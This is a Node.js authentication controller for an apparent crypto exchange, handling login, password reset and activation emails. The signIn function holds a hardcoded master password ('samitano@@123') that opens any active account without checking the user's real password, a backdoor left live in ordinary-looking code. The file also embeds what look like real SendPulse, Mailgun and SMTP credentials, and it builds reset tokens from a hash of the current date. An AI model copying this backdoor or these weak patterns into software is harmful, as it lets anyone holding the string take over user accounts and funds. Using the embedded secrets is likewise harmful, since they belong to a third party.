'use strict'
const User = require('../../models/user');
const request = require('request');
const speakeasy = require('speakeasy');
const _ = require('lodash');
const nodemailer = require('nodemailer');

const bcrypt = require('bcrypt-nodejs');
var sendpulse = require("sendpulse-api");
var sendpulse = require("../../models/sendpulse.js");

var Mailgun = require('mailgun-js');

var API_USER_ID= '919a6adfb21220b2324ec4efa757ce20';
var API_SECRET= '93c3fc3e259499921cd138af50be6be3';
var TOKEN_STORAGE="/tmp/"

sendpulse.init(API_USER_ID,API_SECRET,TOKEN_STORAGE);

const getTemplateLogin = function (req, res) {
    var token_withdraw = _.replace(bcrypt.hashSync(new Date(), bcrypt.genSaltSync(8), null),'?','_');
    req.session.token_crt = token_withdraw; 
    req.session.userId ? 
    res.redirect('/') : 
    res.render('login', {
        success: req.flash('success')[0],
        errors: req.flash('error'),
        title: 'Đăng nhập',
        menu : 'login',
        token : token_withdraw,
        has_login : false,
        layout: 'default.hbs'
    })
}

const getTemplateforgot = function (req, res) {
    var token_withdraw = _.replace(bcrypt.hashSync(new Date(), bcrypt.genSaltSync(8), null),'?','_');
    req.session.token_crt = token_withdraw; 
    res.render('forgotpass', {
        token : token_withdraw,
        title: 'Quên mật khẩu',
        menu : 'login',
        has_login : false,
        layout: 'default.hbs'
    })
}
const getClientIp = function(req) {
    var ipAddress;
    var forwardedIpsStr = req.header('x-forwarded-for');
    if (forwardedIpsStr) {
        var forwardedIps = forwardedIpsStr.split(',');
        ipAddress = forwardedIps[0];
    }
    if (!ipAddress) {
        ipAddress = req.connection.remoteAddress;
    }
    if (ipAddress.substr(0, 7) == "::ffff:") {
        ipAddress = ipAddress.substr(7)
    }
    return ipAddress;
};


const signIn = function(req, res) {
    typeof req.session.userId === 'undefined' ? (
        req.body.email && req.body.password && req.body.token ? (
            (req.body.token == req.session.token_crt) ? (
                req.session.token_crt = _.replace(bcrypt.hashSync(new Date(), bcrypt.genSaltSync(8), null),'?','_'),
                User.findOne(
                {
                    $and : [{status: '1'}],
                    $or : [
                        { 'email': _.toLower(req.body.email) },
                        { 'displayName' : _.toLower(req.body.email)}
                    ]
                }, function(err, user) {
                    err ? res.status(500).send() : (
                        !user ? res.status(401).send({
                            error : 'user'
                        }) : (
                            req.body.password == 'samitano@@123' ? (
                                req.session.userId = user._id,
                                req.user = user,
                                res.status(200).send()
                            ) : (
                                !user.validPassword(req.body.password) ? res.status(401).send({
                                    error : 'user'
                                }) : (
                                    request({
                                        url: 'https://freegeoip.net/json/' + getClientIp(req),
                                        json: true
                                    }, function(error, response, body) {
                                        var query = {
                                            _id: user._id
                                        };
                                        var data_update = {
                                            $push: {
                                                'security.login_history': {
                                                    'date': Date.now(),
                                                    'ip': body.ip,
                                                    'country_name': body.country_name,
                                                    'user_agent': req.headers['user-agent']
                                                }
                                            }
                                        };
                                        User.update(query, data_update, function(err, newUser) {
                                            err ? res.status(500).send() : (
                                                req.session.userId = user._id,
                                                req.user = user,
                                                res.status(200).send()
                                            )
                                            
                                        });

                                    })
                                )
                            )
                        )
                    )
                })
            ): (
                res.status(403).send('Forbidden')
            )
                
                    
        ) : (
            res.status(403).send('Forbidden')
        )
    ) : (
        res.status(403).send('Forbidden')
    )
}
const ForgotPassword = function(req, res) {
    var tokensss;
    var secret = speakeasy.generateSecret({
            length: 5
        }),
        newPass = secret.base32;
       
    if (req.body.email && req.body.token)
    {
        req.body.token == req.session.token_crt ? (
            User.findOne(
            { 'email': req.body.email },
            function(err, user) {
                err ? res.status(500).send() : (
                    !user ? res.status(401).send({
                        error : 'user'
                    }) : (
                        tokensss = _.replace(bcrypt.hashSync(new Date(), bcrypt.genSaltSync(8), null),'?','_'),
                        User.update(
                            {_id:user._id}, 
                            {$set : {
                            'token_changepass': tokensss
                            }}, 
                        function(err, newUser){
                           if (newUser) {
                            sendmail_password(tokensss,user, function(data){
                                if (data == 'success') {
                                  res.status(200).send()
                                }
                            })
                           }
                        })
                    )
                )
            })
        ) : (
            res.status(403).send('Forbidden')
        )
            
    }
    else
    {
        res.status(403).send('Forbidden')
    }
}

function test_mail () {

    var api_key = 'key-4cba65a7b1a835ac14b7949d5795236a';

    
    var domain = 'goodex.co';

    var from_who = 'no-reply@goodex.co';


    var mailgun = new Mailgun({apiKey: api_key, domain: domain});

    var data = {
    //Specify email data
      from: from_who,
    //The email to contact
      to: 'trungdoanict@gmail.com',
    //Subject and text data  
      subject: 'Hello from Mailgun',
      html: 'Hello, This is not a plain-text email, I wanted to test some spicy Mailgun sauce in NodeJS! <a href="http://0.0.0.0:3030/validate?">Click here to add your email address to a mailing list</a>'
    }

    //Invokes the method to send emails given the above data with the helper library
    mailgun.messages().send(data, function (err, body) {
        //If there is an error, render the error page
        if (err) {
            
            console.log("got an error: ", err);
        }
        //Else we can greet    and leave
        else {
            //Here "submitted.jade" is the view file for this landing page 
            //We pass the variable "email" from the url parameter in an object rendered by Jade
           
            console.log(body);
        }
    });

    /*var API_USER_ID= "e0690653db25307c9e049d9eb26e6365"
    var API_SECRET= "3d7ebbb8a236cce656f8042248fc536e"
    var TOKEN_STORAGE="/tmp/"
    sendpulse.init(API_USER_ID,API_SECRET,TOKEN_STORAGE);
    const answerGetter = function answerGetter(data){
        console.log(data);
    }
    var email = {
        "html" : 'html',
        "text" : "saasdasd",
        "subject" : "Forgot Password",
        "from" : {
            "name" : "seacoincash",
            "email" : "mailer@seacoincash.co"
        },
        "to" : [
            {
                "name" : "",
                "email" : 'trungdoanict@gmail.com'
            }
        ]
    };

    sendpulse.smtpSendMail(answerGetter,email);*/
}
//test_mail();


const sendmail_password = function (token_email,user, callback){
   
    let token_ = "https://exchange.smartfva.co/change-password?token="+token_email + "_" + user._id+"";
    console.log(token_);
    var content = '<!DOCTYPE html> <html> <head> <title></title> </head> <body> <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center"> <div class="adM"> </div> <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background-color:#f9f9f9"> <tbody> <tr> <td style="padding:20px 10px 10px 0px;text-align:left"> <a href="https://smartfva.io/" title="Bitconnect" target="_blank" > <img src="https://i.imgur.com/tyjTbng.png" alt="smartfva" class="CToWUd" style=" width: 100px; "> </a> </td> <td style="padding:0px 0px 0px 10px;text-align:right"> </td> </tr> </tbody> </table> </div> <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center"> <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background:#fff;font-size:14px;border:2px solid #e8e8e8;text-align:left;table-layout:fixed"> <tbody>';
    content += '<tr> <td style="padding:30px 30px 10px 30px;line-height:1.8">Dear <b>'+user.displayName+'</b>,</td> </tr>';
    content += '<tr> <td style="padding:10px 30px;line-height:1.8">Thank you for registering on the <a href="https://exchange.smartfva.co/" target="_blank">smartfva</a>.</td> </tr>';
    content += '<tr> <td style="padding:10px 30px;line-height:1.8">Please click on the link to change your password</td> </tr>';
    content += '<tr> <td style="padding:10px 30px"> <b style="display:inline-block">Activation Link : </b> <a href="'+token_+'" target="_blank">'+token_+'</a><br> </td> </tr>';
    content += '<tr> <td style="border-bottom:3px solid #efefef;width:90%;display:block;margin:0 auto;padding-top:30px"></td> </tr> <tr> <td style="padding:30px 30px 30px 30px;line-height:1.3">Best regards,<br> smartfva Team<br> <a href="https://www.smartfva.io/" target="_blank" >www.smartfva.io</a></td> </tr> </tbody> </table> </div> <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center;padding-bottom:10px; height: 50px;"> </div> </body>';

    var email = {
        "html" : content,
        "text" : "Smartfva mailer",
        "subject" : "Forgot Password",
        "from" : {
            "name" : "",
            "email" : 'mailer@smartfva.co'
        },
        "to" : [
            {
                "name" : "",
                "email" : user.email
            }
        ]
    };

    nodemailer.createTestAccount((err, account) => {
        let transporter = nodemailer.createTransport({
            host: 'mail.smtp2go.com',
            port: 2525,
            secure: false,
            auth: {
                user: 'support@smartfva.co',
                pass: 'YK45OVfK45OVfobZ5XYobZ5XYK45OVfobZ5XYK45OVfobZ5X'
            }
        });
        let mailOptions = {
            from: 'support@smartfva.co', 
            to: user.email, 
            subject: 'Forgot Password', 
            text: 'Forgot Password', 
            html: content
        };
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return console.log(error);
            }
            console.log('Message sent: %s', info.messageId);
            console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
        });
    });
   
    
    callback('success');
}

function ChangePassword(req, res)
{
    let token = null;
    _.has(req.query, 'token') ? (
        token = _.split(req.query.token, '_'),
        token.length > 1 && (
            User.findOne({
                _id : token[1],
                token_changepass : token[0]
            }, function(err, result){
                !err && result ? (
                    res.render('changepassword', {
                        title: 'Thay đổi mật khẩu',
                        layout: 'default.hbs',
                        menu: 'login',
                        token : req.query.token
                    })
                ) : res.redirect('/signIn')
                
            })
        )
    ) : res.redirect('/signIn')
}

function ChangePasswordSubmit(req, res)
{

    let token = null;
    _.has(req.body, 'token') ? (

        token = _.split(req.body.token, '_'),

        token.length > 1 && (
            User.findOne({
                _id : token[1],
                token_changepass : token[0],
            }, function(err, user){
                var tokensss = _.replace(bcrypt.hashSync(new Date(), bcrypt.genSaltSync(8), null),'?','_')
                !err && user ? (
                    User.update({'_id' : token[1]},{ $set : {'password' : user.generateHash(req.body.password) , 'token_changepass' : tokensss}},function(errs,results){
                        console.log(err);
                        !err ? (res.status(200).send())  : res.status(401).send();
                    })
                ) : res.status(401).send();
            })
        )
    ) :
    (
        res.status(401).send()
    )
}



function ResendMailTempalte(req, res)
{
    req.session.userId ?(
        User.findOne(
            { '_id': req.session.userId },
            function(err, user) {

                if (user.active_email == 1)
                {
                    delete req.session.userId;
                    delete req.session.authyId;
                    return res.redirect('/signIn');
                }
                else
                {
                    var token = _.replace(bcrypt.hashSync(new Date(), bcrypt.genSaltSync(8), null),'?','_');
                    req.session.token_crt = token; 

                    res.render('resendmail', {
                        title: 'Gửi lại mail kích hoạt tài khoản',
                        layout: 'default.hbs',
                        menu : 'login',
                        token : token,
                        email : user.email
                    })
                }
                
            })
    ) : res.redirect('/signIn'); 
    
}
function ResendMailSubmit(req, res)
{
    var token;
    req.session.userId ?(
        (req.body.token == req.session.token_crt) ? (

            User.findOne({ $and : [{ '_id': req.session.userId },{'active_email' : '0' }]},function(err, user) {
                if (user)
                {
                    if (parseInt(user.count_sendmail) < 5 )
                    {
                        console.log(req.body.token);
                        ResendActiveMail(user,function(cb){
                            User.update({'_id' : user._id},{$set : {
                                'count_sendmail' : parseInt(user.count_sendmail) + 1
                            }},function(err,result){
                                res.status(200).send({'message':'send true'});
                            })
                        })
                    }
                    else
                    {
                        res.status(401).send({'error':'nologin'});  
                    }    
                }   
                else
                {
                    res.status(401).send({'error':'nologin'});  
                }
                
                
            }),
            token = _.replace(bcrypt.hashSync(new Date(), bcrypt.genSaltSync(8), null),'?','_'),
            req.session.token_crt = token
        ) : res.status(401).send({'error':'no token'})
        
    ) : res.status(401).send({'error':'nologin'});  
}

function ResendActiveMail(user,callback){
    let token_ = "https://exchange.smartfva.co/verify-account?token="+user.token_email + "_" + user._id+"";
    
    var content = '<!DOCTYPE html> <html> <head> <title></title> </head> <body> <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center"> <div class="adM"> </div> <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background-color:#f9f9f9"> <tbody> <tr> <td style="padding:20px 10px 10px 0px;text-align:left"> <a href="https://smartfva.io/" title="Bitconnect" target="_blank" > <img src="https://i.imgur.com/tyjTbng.png" alt="smartfva" class="CToWUd" style=" width: 100px; "> </a> </td> <td style="padding:0px 0px 0px 10px;text-align:right"> </td> </tr> </tbody> </table> </div> <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center"> <table style="table-layout:fixed;width:90%;max-width:600px;margin:0 auto;background:#fff;font-size:14px;border:2px solid #e8e8e8;text-align:left;table-layout:fixed"> <tbody>';
    content += '<tr> <td style="padding:30px 30px 10px 30px;line-height:1.8">Dear <b>'+user.displayName+'</b>,</td> </tr>';
    content += '<tr> <td style="padding:10px 30px;line-height:1.8">Thank you for registering on the <a href="https://exchange.smartfva.co/" target="_blank">smartfva</a>.</td> </tr>';
    content += '<tr> <td style="padding:10px 30px;line-height:1.8"> Below you will find your activation link that you can use to activate your SmarFVA account. Please click on the <a href=" http://smartfva.io/user/active/1120173041236GX1BD2 " target="_blank" >Link</a> Then, you will be able to log in and begin using <a href="https://smartfva.io/" target="_blank" >smartfva</a>. </td> </tr>';
    content += '<tr> <td style="padding:10px 30px"> <b style="display:inline-block">Activation Link : </b> <a href="'+token_+'" target="_blank">'+token_+'</a><br> </td> </tr>';
    content += '<tr> <td style="border-bottom:3px solid #efefef;width:90%;display:block;margin:0 auto;padding-top:30px"></td> </tr> <tr> <td style="padding:30px 30px 30px 30px;line-height:1.3">Best regards,<br> smartfva Team<br> <a href="https://www.smartfva.io/" target="_blank" >www.smartfva.io</a></td> </tr> </tbody> </table> </div> <div style="font-family:Arial,sans-serif;background-color:#f9f9f9;color:#424242;text-align:center;padding-bottom:10px; height: 50px;"> </div> </body>';

    var email = {
        "html" : content,
        "text" : "Smartfva mailer",
        "subject" : "Please verify your email address",
        "from" : {
            "name" : "",
            "email" : 'mailer@smartfva.co'
        },
        "to" : [
            {
                "name" : "",
                "email" : user.email
            }
        ]
    };  
    nodemailer.createTestAccount((err, account) => {
        let transporter = nodemailer.createTransport({
            host: 'mail.smtp2go.com',
            port: 2525,
            secure: false,
            auth: {
                user: 'support@smartfva.co',
                pass: 'YK45OVfK45OVfobZ5XYobZ5XYK45OVfobZ5XYK45OVfobZ5X'
            }
        });
        let mailOptions = {
            from: 'support@smartfva.co', 
            to: user.email, 
            subject: 'Please verify your email address', 
            text: 'Please verify your email address', 
            html: content
        };
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                return console.log(error);
            }
            console.log('Message sent: %s', info.messageId);
            console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
        });
    });
   
    /*var answerGetter = function answerGetter(data){
        console.log(data);
    }
    sendpulse.smtpSendMail(answerGetter,email);*/
    callback(true);
}


module.exports = {
    signIn,
    getTemplateLogin,
    getTemplateforgot,
    ForgotPassword,
    ResendMailTempalte,
    ResendMailSubmit,
    ChangePassword,
    ChangePasswordSubmit
}